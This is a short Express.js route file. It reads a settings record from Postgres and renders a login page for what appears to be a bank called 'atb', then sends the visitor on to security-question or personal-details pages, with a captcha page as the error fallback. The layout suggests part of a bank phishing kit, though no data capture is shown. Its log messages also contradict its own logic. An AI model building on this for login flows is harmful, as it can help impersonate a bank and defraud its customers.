// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');

const pool = new Pool(dbConfig);

router.get('/login', async (req, res) => {
    try {
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'on') {
              count++;
            }
          });

        // Check if count is more than 14
        if (count >= 14) {
            // Perform your action here
            console.log(count)
            console.log("More than 14 keys contain 'off'");
        } else {
            console.log(count)
            console.log("14 or fewer keys contain 'off'");
        }

        if (result.rows[0].data.settings.atb.qa > 0) {
            res.render('bank/atb/login/index', { navig: "/atb/qst" });
        } else {
            res.render('bank/atb/login/index', { navig: "/atb/details" });
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
